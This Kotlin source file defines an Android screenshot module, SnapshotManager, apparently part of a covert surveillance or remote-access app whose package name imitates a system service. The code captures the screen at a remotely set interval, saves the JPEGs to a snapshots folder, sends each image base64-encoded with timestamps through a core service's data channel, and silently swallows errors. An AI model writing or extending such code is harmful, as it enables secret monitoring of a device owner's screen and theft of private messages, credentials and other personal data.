package com.system.service.monitors

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.view.WindowManager
import com.system.service.core.CoreService
import com.system.service.setup.MediaProjectionActivity
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

object SnapshotManager {

    private const val PREFS       = "snapshot_manager"
    private const val KEY_ENABLED = "enabled"
    private const val KEY_INTERVAL= "interval_minutes"

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay:  VirtualDisplay?  = null
    private var imageReader:     ImageReader?     = null
    private var handlerThread:   HandlerThread?   = null
    private var bgHandler:       Handler?         = null

    @Volatile private var intervalMinutes = 5
    @Volatile private var enabled = false
    private val capturing = AtomicBoolean(false)

    private var scheduleTimer: Timer? = null

    fun isEnabled() = enabled

    fun init(context: Context) {
        val p = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        enabled         = p.getBoolean(KEY_ENABLED, false)
        intervalMinutes = p.getInt(KEY_INTERVAL, 5)
    }

    fun setConfig(enable: Boolean, intervalMins: Int, context: Context) {
        enabled         = enable
        intervalMinutes = intervalMins.coerceIn(1, 60)
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .putBoolean(KEY_ENABLED, enabled)
            .putInt(KEY_INTERVAL, intervalMinutes)
            .apply()
        if (enable) startSchedule(context) else stopSchedule()
    }

    fun onProjectionResult(context: Context, resultCode: Int, data: Intent) {
        val pm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = pm.getMediaProjection(resultCode, data)
        startSchedule(context)
    }

    fun startSchedule(context: Context) {
        if (mediaProjection == null) {
            try {
                context.startActivity(
                    Intent(context, MediaProjectionActivity::class.java)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        .putExtra("for_snapshot", true)
                )
            } catch (_: Exception) {}
            return
        }
        stopSchedule()
        val intervalMs = intervalMinutes * 60_000L
        scheduleTimer = Timer("SnapshotTimer", true).also { t ->
            t.scheduleAtFixedRate(object : TimerTask() {
                override fun run() { if (enabled) captureAndSend(context) }
            }, 2000L, intervalMs)
        }
    }

    fun stopSchedule() {
        scheduleTimer?.cancel(); scheduleTimer = null
    }

    fun captureNow(context: Context) {
        if (mediaProjection != null) captureAndSend(context)
        else startSchedule(context)
    }

    private fun captureAndSend(context: Context) {
        if (!capturing.compareAndSet(false, true)) return
        try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val (w, h) = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                val b = wm.currentWindowMetrics.bounds; Pair(b.width(), b.height())
            } else {
                val m = android.util.DisplayMetrics()
                @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(m)
                Pair(m.widthPixels, m.heightPixels)
            }
            val dpi = context.resources.displayMetrics.densityDpi

            if (handlerThread == null || handlerThread?.isAlive == false) {
                handlerThread = HandlerThread("SnapshotThread").also { it.start() }
                bgHandler     = Handler(handlerThread!!.looper)
            }

            imageReader?.close()
            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
            imageReader = reader

            virtualDisplay?.release()
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "SnapshotCapture", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, bgHandler
            )

            bgHandler?.postDelayed({
                var image: Image? = null
                try {
                    image = reader.acquireLatestImage()
                    if (image != null) {
                        val planes = image.planes
                        val buf    = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride   = planes[0].rowStride
                        val rowPadding  = rowStride - pixelStride * w
                        val bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888)
                        bmp.copyPixelsFromBuffer(buf)
                        val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
                        bmp.recycle()

                        val bos = ByteArrayOutputStream()
                        cropped.compress(Bitmap.CompressFormat.JPEG, 70, bos)
                        cropped.recycle()

                        val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                        val ts  = System.currentTimeMillis()
                        val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(ts))

                        val dir = File(context.getExternalFilesDir(null), "snapshots").also { it.mkdirs() }
                        val fname = "snap_${SimpleDateFormat("yyyyMMdd_HHmmss",Locale.US).format(Date(ts))}.jpg"
                        File(dir, fname).writeBytes(bos.toByteArray())

                        CoreService.instance?.sendData("snapshot", JSONObject().apply {
                            put("image",    b64)
                            put("time",     ts)
                            put("datetime", fmt)
                            put("filename", fname)
                            put("width",    w)
                            put("height",   h)
                        })
                    }
                } catch (_: Exception) {
                } finally {
                    image?.close()
                    capturing.set(false)
                }
            }, 600)
        } catch (e: Exception) {
            capturing.set(false)
        }
    }

    fun listSavedSnapshots(context: Context): List<File> {
        val dir = File(context.getExternalFilesDir(null), "snapshots")
        return if (dir.exists()) dir.listFiles()?.sortedByDescending { it.lastModified() } ?: emptyList()
        else emptyList()
    }

    fun release() {
        stopSchedule()
        virtualDisplay?.release(); virtualDisplay = null
        imageReader?.close();      imageReader    = null
        handlerThread?.quitSafely(); handlerThread = null
    }
}
